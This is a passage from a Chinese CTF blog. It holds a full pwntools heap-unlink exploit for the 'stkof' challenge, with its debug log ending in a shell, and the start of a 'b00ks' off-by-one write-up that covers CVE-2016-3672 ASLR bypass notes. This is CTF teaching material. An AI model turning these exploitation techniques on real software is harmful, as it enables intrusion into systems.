class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-* coding:utf -*</span></span><br><span class="line"></span><br><span class="line"><span class="string">"""</span><br><span class="line">python 2.7</span><br><span class="line">"""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alloc</span><span class="params">(p)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">"1"</span>)</span><br><span class="line">    p.sendline(<span class="string">"128"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"OK\n"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(p,idx,content)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">"2"</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.sendline(str(len(content)))</span><br><span class="line">    p.send(content)</span><br><span class="line">    p.recvuntil(<span class="string">"OK\n"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(p,idx)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">"3"</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">"./libc-2.24.so"</span>)</span><br><span class="line">stkof = ELF(<span class="string">"./stkof"</span>)</span><br><span class="line">p = process(<span class="string">"./stkof"</span>)</span><br><span class="line">g_addr = <span class="number">0x602150</span></span><br><span class="line"></span><br><span class="line">alloc(p)</span><br><span class="line">alloc(p)</span><br><span class="line">alloc(p)</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">'\x00'</span>*<span class="number">0x10</span> + p64(g_addr<span class="number">-0x18</span>) + p64(g_addr<span class="number">-0x10</span>) + <span class="string">'a'</span>*<span class="number">0x60</span> + p64(<span class="number">0x80</span>) + p64(<span class="number">0x90</span>)</span><br><span class="line"></span><br><span class="line">edit(p,<span class="number">2</span>,payload1)</span><br><span class="line"><span class="comment"># 1.bypass unlink</span></span><br><span class="line">free(p,<span class="number">3</span>)</span><br><span class="line">p.recvuntil(<span class="string">"OK\n"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.overwrite got table</span></span><br><span class="line">payload2 = p64(<span class="number">0</span>)*<span class="number">2</span> + p64(stkof.got[<span class="string">"free"</span>]) + p64(stkof.got[<span class="string">"puts"</span>])</span><br><span class="line">edit(p,<span class="number">2</span>,payload2)</span><br><span class="line"></span><br><span class="line">payload3 = p64(stkof.plt[<span class="string">"puts"</span>])</span><br><span class="line">edit(p,<span class="number">1</span>,payload3)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3.leak puts addr</span></span><br><span class="line">free(p,<span class="number">2</span>)</span><br><span class="line"><span class="comment"># puts_addr = u64(p.recv(6) + "\x00\x00")</span></span><br><span class="line"><span class="comment"># puts_addr = p.recv(6).strip().ljust(8,"\x00")</span></span><br><span class="line"><span class="comment"># p.recv(4)</span></span><br><span class="line">puts_addr = p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)</span><br><span class="line">p.recv(<span class="number">4</span>)</span><br><span class="line">puts_addr = u64(puts_addr)</span><br><span class="line"><span class="keyword">print</span> hex(puts_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">system_addr = puts_addr - libc.symbols[<span class="string">"puts"</span>] + libc.symbols[<span class="string">"system"</span>]</span><br><span class="line"><span class="comment"># binsh_addr = puts_addr - libc.symbols["puts"] + next(libc.search('/bin/sh'))</span></span><br><span class="line">log.success(<span class="string">'system addr: '</span> + hex(system_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4.continue overwrite got table</span></span><br><span class="line">payload4 = p64(system_addr)</span><br><span class="line">edit(p,<span class="number">1</span>,payload4)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5.exec sh</span></span><br><span class="line">alloc(p)</span><br><span class="line">binsh=<span class="string">"/bin/sh\x00"</span></span><br><span class="line">edit(p,<span class="number">4</span>,binsh)</span><br><span class="line">context.terminal = [<span class="string">'./stkof'</span>, <span class="string">'-e'</span>, <span class="string">'sh'</span>, <span class="string">'-c'</span>]</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">log.info(<span class="string">"[Exec sh...]"</span>)</span><br><span class="line">free(p,<span class="number">4</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">$ python ./stkof_pwn.py DEBUG</span><br><span class="line">[DEBUG] PLT <span class="number">0x1f880</span> realloc</span><br><span class="line">[DEBUG] PLT <span class="number">0x1f890</span> __tls_get_addr</span><br><span class="line">[DEBUG] PLT <span class="number">0x1f8b0</span> memalign</span><br><span class="line">[DEBUG] PLT <span class="number">0x1f8e0</span> _dl_find_dso_for_object</span><br><span class="line">[DEBUG] PLT <span class="number">0x1f900</span> calloc</span><br><span class="line">[DEBUG] PLT <span class="number">0x1f930</span> malloc</span><br><span class="line">[DEBUG] PLT <span class="number">0x1f938</span> free</span><br><span class="line">[*] <span class="string">'/mnt/d/workplace/CTF/2014hctf/stkof/libc-2.24.so'</span></span><br><span class="line">Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br><span class="line">[DEBUG] PLT <span class="number">0x40074c</span> free</span><br><span class="line">[DEBUG] PLT <span class="number">0x400760</span> puts</span><br><span class="line">[DEBUG] PLT <span class="number">0x400770</span> fread</span><br><span class="line">[DEBUG] PLT <span class="number">0x400780</span> strlen</span><br><span class="line">[DEBUG] PLT <span class="number">0x400790</span> __stack_chk_fail</span><br><span class="line">[DEBUG] PLT <span class="number">0x4007a0</span> printf</span><br><span class="line">[DEBUG] PLT <span class="number">0x4007b0</span> alarm</span><br><span class="line">[DEBUG] PLT <span class="number">0x4007c0</span> __libc_start_main</span><br><span class="line">[DEBUG] PLT <span class="number">0x4007d0</span> fgets</span><br><span class="line">[DEBUG] PLT <span class="number">0x4007e0</span> atoll</span><br><span class="line">[DEBUG] PLT <span class="number">0x4007f0</span> __gmon_start__</span><br><span class="line">[DEBUG] PLT <span class="number">0x400800</span> malloc</span><br><span class="line">[DEBUG] PLT <span class="number">0x400810</span> fflush</span><br><span class="line">[DEBUG] PLT <span class="number">0x400820</span> atol</span><br><span class="line">[DEBUG] PLT <span class="number">0x400830</span> atoi</span><br><span class="line">[*] <span class="string">'/mnt/d/workplace/CTF/2014hctf/stkof/stkof'</span></span><br><span class="line">Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (<span class="number">0x400000</span>)</span><br><span class="line">[+] Starting local process <span class="string">'./stkof'</span>: pid <span class="number">390</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> bytes:</span><br><span class="line"><span class="string">'1\n'</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x4</span> bytes:</span><br><span class="line"><span class="string">'128\n'</span></span><br><span class="line">[DEBUG] Received <span class="number">0x5</span> bytes:</span><br><span class="line"><span class="string">'1\n'</span></span><br><span class="line"><span class="string">'OK\n'</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> bytes:</span><br><span class="line"><span class="string">'1\n'</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x4</span> bytes:</span><br><span class="line"><span class="string">'128\n'</span></span><br><span class="line">[DEBUG] Received <span class="number">0x5</span> bytes:</span><br><span class="line"><span class="string">'2\n'</span></span><br><span class="line"><span class="string">'OK\n'</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> bytes:</span><br><span class="line"><span class="string">'1\n'</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x4</span> bytes:</span><br><span class="line"><span class="string">'128\n'</span></span><br><span class="line">[DEBUG] Received <span class="number">0x5</span> bytes:</span><br><span class="line"><span class="string">'3\n'</span></span><br><span class="line"><span class="string">'OK\n'</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> bytes:</span><br><span class="line"><span class="string">'2\n'</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> bytes:</span><br><span class="line"><span class="string">'2\n'</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x4</span> bytes:</span><br><span class="line"><span class="string">'144\n'</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x90</span> bytes:</span><br><span class="line"><span class="number">00000000</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  |····|····|····|····|</span><br><span class="line"><span class="number">00000010</span>  <span class="number">38</span> <span class="number">21</span> <span class="number">60</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">40</span> <span class="number">21</span> <span class="number">60</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  |<span class="number">8</span>!`·|····|@!`·|····|</span><br><span class="line"><span class="number">00000020</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  |aaaa|aaaa|aaaa|aaaa|</span><br><span class="line">*</span><br><span class="line"><span class="number">00000080</span>  <span class="number">80</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">90</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  |····|····|····|····|</span><br><span class="line"><span class="number">00000090</span></span><br><span class="line">[DEBUG] Received <span class="number">0x3</span> bytes:</span><br><span class="line"><span class="string">'OK\n'</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> bytes:</span><br><span class="line"><span class="string">'3\n'</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> bytes:</span><br><span class="line"><span class="string">'3\n'</span></span><br><span class="line">[DEBUG] Received <span class="number">0x3</span> bytes:</span><br><span class="line"><span class="string">'OK\n'</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> bytes:</span><br><span class="line"><span class="string">'2\n'</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> bytes:</span><br><span class="line"><span class="string">'2\n'</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x3</span> bytes:</span><br><span class="line"><span class="string">'32\n'</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x20</span> bytes:</span><br><span class="line"><span class="number">00000000</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  |····|····|····|····|</span><br><span class="line"><span class="number">00000010</span>  <span class="number">18</span> <span class="number">20</span> <span class="number">60</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">20</span> <span class="number">20</span> <span class="number">60</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  |· `·|····|  `·|····|</span><br><span class="line"><span class="number">00000020</span></span><br><span class="line">[DEBUG] Received <span class="number">0x3</span> bytes:</span><br><span class="line"><span class="string">'OK\n'</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> bytes:</span><br><span class="line"><span class="string">'2\n'</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> bytes:</span><br><span class="line"><span class="string">'1\n'</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> bytes:</span><br><span class="line"><span class="string">'8\n'</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x8</span> bytes:</span><br><span class="line"><span class="number">00000000</span>  <span class="number">60</span> <span class="number">07</span> <span class="number">40</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>                            |`·@·|····||</span><br><span class="line"><span class="number">00000008</span></span><br><span class="line">[DEBUG] Received <span class="number">0x3</span> bytes:</span><br><span class="line"><span class="string">'OK\n'</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> bytes:</span><br><span class="line"><span class="string">'3\n'</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> bytes:</span><br><span class="line"><span class="string">'2\n'</span></span><br><span class="line">[DEBUG] Received <span class="number">0xa</span> bytes:</span><br><span class="line"><span class="number">00000000</span>  <span class="number">90</span> <span class="number">8</span>f ec <span class="number">5</span>e  <span class="number">72</span> <span class="number">7</span>f <span class="number">0</span>a <span class="number">4</span>f  <span class="number">4</span>b <span class="number">0</span>a                     |···^|r··O|K·|</span><br><span class="line"><span class="number">0000000</span>a</span><br><span class="line"><span class="number">0x7f725eec8f90</span></span><br><span class="line">[+] system addr: <span class="number">0x7f725ee9f480</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> bytes:</span><br><span class="line"><span class="string">'2\n'</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> bytes:</span><br><span class="line"><span class="string">'1\n'</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> bytes:</span><br><span class="line"><span class="string">'8\n'</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x8</span> bytes:</span><br><span class="line"><span class="number">00000000</span>  <span class="number">80</span> f4 e9 <span class="number">5</span>e  <span class="number">72</span> <span class="number">7</span>f <span class="number">00</span> <span class="number">00</span>                            |···^|r···||</span><br><span class="line"><span class="number">00000008</span></span><br><span class="line">[DEBUG] Received <span class="number">0x3</span> bytes:</span><br><span class="line"><span class="string">'OK\n'</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> bytes:</span><br><span class="line"><span class="string">'1\n'</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x4</span> bytes:</span><br><span class="line"><span class="string">'128\n'</span></span><br><span class="line">[DEBUG] Received <span class="number">0x5</span> bytes:</span><br><span class="line"><span class="string">'4\n'</span></span><br><span class="line"><span class="string">'OK\n'</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> bytes:</span><br><span class="line"><span class="string">'2\n'</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> bytes:</span><br><span class="line"><span class="string">'4\n'</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> bytes:</span><br><span class="line"><span class="string">'8\n'</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x8</span> bytes:</span><br><span class="line"><span class="number">00000000</span>  <span class="number">2</span>f <span class="number">62</span> <span class="number">69</span> <span class="number">6</span>e  <span class="number">2</span>f <span class="number">73</span> <span class="number">68</span> <span class="number">00</span>                            |/bin|/sh·||</span><br><span class="line"><span class="number">00000008</span></span><br><span class="line">[DEBUG] Received <span class="number">0x3</span> bytes:</span><br><span class="line"><span class="string">'OK\n'</span></span><br><span class="line">[*] [Exec sh...]</span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> bytes:</span><br><span class="line"><span class="string">'3\n'</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> bytes:</span><br><span class="line"><span class="string">'4\n'</span></span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ whoami</span><br><span class="line">[DEBUG] Sent <span class="number">0x7</span> bytes:</span><br><span class="line"><span class="string">'whoami\n'</span></span><br><span class="line">[DEBUG] Received <span class="number">0x5</span> bytes:</span><br><span class="line"><span class="string">'asan\n'</span></span><br><span class="line">asan</span><br><span class="line">$</span><br></pre></td></tr></table></figure></p>
<h1><span id="reference">Reference</span></h1><ul>
<li><a href="https://0x3f97.github.io/pwn/2018/01/17/hitconctf2014-stkof/" target="_blank" rel="external">https://0x3f97.github.io/pwn/2018/01/17/hitconctf2014-stkof/</a></li>
<li><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/heap/unlink/#_5" target="_blank" rel="external">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/heap/unlink/#_5</a></li>
</ul>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2018/10/21/b00ks_detail/" itemprop="url">
                  b00ks - null byte off-by-one 实战详解
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            <span class="post-meta-item-icon">
              <i class="fa fa-calendar-o"></i>
            </span>
            <span class="post-meta-item-text">发表于</span>
            <time itemprop="dateCreated" datetime="2018-10-21T12:00:00+08:00" content="2018-10-21">
              2018-10-21
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp;
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/heap/" itemprop="url" rel="index">
                    <span itemprop="name">heap</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
                &nbsp; | &nbsp;
                <a href="/2018/10/21/b00ks_detail/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2018/10/21/b00ks_detail/" itemprop="commentsCount"></span>
                </a>
              </span>
            
          

          

          
          

          
        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>heap null byte off-by-one</p>
<p>分析环境：</p>
<ul>
<li>Linux parrot 4.17.0-parrot17-amd64 #1 SMP Parrot 4.17.17-1parrot17 (2018-08-27) x86_64 GNU/Linux</li>
<li>pwntools:3.12.1</li>
<li>gdb + gef, IDA</li>
<li>libc:2.27</li>
</ul>
<p>checksec:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$checksec ./b00ks</span><br><span class="line">Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">Canary    No</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br><span class="line">Fortify   No</span><br></pre></td></tr></table></figure></p>
<p>保护全开，ret2plt,覆写 got table 就不要想了</p>
<h1><span id="定位漏洞点">定位漏洞点</span></h1><p>问题出在 book name read() 控制上，也就是 offset+0x9f5 这个函数上：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> __int64 __<span class="function">fastcall <span class="title">sub_9F5</span><span class="params">(_BYTE *a1, <span class="keyword">int</span> a2)</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">	_BYTE *buf; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ( a2 &lt;= <span class="number">0</span> )</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">	buf = a1;</span><br><span class="line">	<span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )&#123;</span><br><span class="line">		<span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)read(<span class="number">0</span>, buf, <span class="number">1u</span>LL) != <span class="number">1</span> )</span><br><span class="line">			<span class="keyword">return</span> <span class="number">1L</span>L;</span><br><span class="line">		<span class="keyword">if</span> ( *buf == <span class="number">10</span> )</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		++buf;</span><br><span class="line">		<span class="keyword">if</span> ( i == a2 )</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	*buf = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>a2 是输入的 author name size - 1;a1 是 malloc(a2+1) 返回的指针.</p>
<p>从这段 for 循环中可以看出，实际可以 read() a2+1 次，那么 ‘\x00’ 自然也会被写入到内存中了。这是一种很典型的栅栏错误。</p>
<p>author name 位于 bss 段，其后是一个 book struct 指针表</p>
<p>通过 4 选项，可以知道 book detail:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> book&#123;</span><br><span class="line">	<span class="keyword">int</span> id;</span><br><span class="line">	<span class="keyword">char</span> *name;</span><br><span class="line">	<span class="keyword">char</span> *description;</span><br><span class="line">	<span class="keyword">int</span> size;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<h1><span id="分析过程">分析过程</span></h1><p>在以下地方下断比较好分析：</p>
<ul>
<li>b *0x555555554af1，获取功能号前</li>
<li>b *0x123b,0x555555554240，选项前一行</li>
<li>b *0x9f5,0x0x55555555549f5，读取字符串函数</li>
</ul>
<p><strong>关键点</strong>：如果要堆分配的内存很大的话，那么会使用 mmap 来重新申请内存空间，并且这块区域邻近 bss 段。offset == mmap ret addr - libc base addr，那么就可以推算出 libc base addr。</p>
<p>关于这个点，我一直很疑惑，通过实际代码在不同的 Linux 发行版上测试，大部分情况下这个偏移是固定，但在 wsl debian 这个偏移就不固定了。</p>
<h1><span id="linux-mmap-aslr-失效漏洞">linux mmap ASLR 失效漏洞</span></h1><p>这里介绍一个 Linux mmap ASLR 失效的漏洞，CVE-2016-3672。</p>
<p>影响范围：Linux kernel &lt;= 4.5.2</p>
<p>验证方法：</p>
<ul>
<li>设置栈空间为不限制大小ulimit -s unlimited</li>
<li>使用ldd看动态库加载的地址是否发生变化</li>
</ul>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">$ uname -r</span><br><span class="line">2.6.32-642.el6.i686</span><br><span class="line"></span><br><span class="line">$ cat /proc/sys/kernel/randomize_va_space </span><br><span class="line">2</span><br><span class="line"></span><br><span class="line">$ ulimit -a</span><br><span class="line">core file size          (blocks, -c) 0</span><br><span class="line">data seg size           (kbytes, -d) unlimited</span><br><span class="line">scheduling priority             (-e) 0</span><br><span class="line">file size               (blocks, -f) unlimited</span><br><span class="line">pending signals                 (-i) 7864</span><br><span class="line">max locked memory       (kbytes, -l) 64</span><br><span class="line">max memory size         (kbytes, -m) unlimited</span><br><span class="line">open files                      (-n) 1024</span><br><span class="line">pipe size            (512 bytes, -p) 8</span><br><span class="line">POSIX message queues     (bytes, -q) 819200</span><br><span class="line">real-time priority              (-r) 0</span><br><span class="line">stack size              (kbytes, -s) 10240</span><br><span class="line">cpu time               (seconds, -t) unlimited</span><br><span class="line">max user processes              (-u) 7864</span><br><span class="line">virtual memory          (kbytes, -v) unlimited</span><br><span class="line">file locks                      (-x) unlimited</span><br><span class="line"></span><br><span class="line">$ ldd ./mmap_libc_base_addr32 </span><br><span class="line">linux-gate.so.1 =&gt;  (0x00b05000)</span><br><span class="line">libc.so.6 =&gt; /lib/libc.so.6 (0x00296000)</span><br><span class="line">/lib/ld-linux.so.2 (0x00a51000)</span><br><span class="line"></span><br><span class="line">$ ldd ./mmap_libc_base_addr32 </span><br><span class="line">linux-gate.so.1 =&gt;  (0x009ba000)</span><br><span class="line">libc.so.6 =&gt; /lib/libc.so.6 (0x00505000)</span><br><span class="line">/lib/ld-linux.so.2 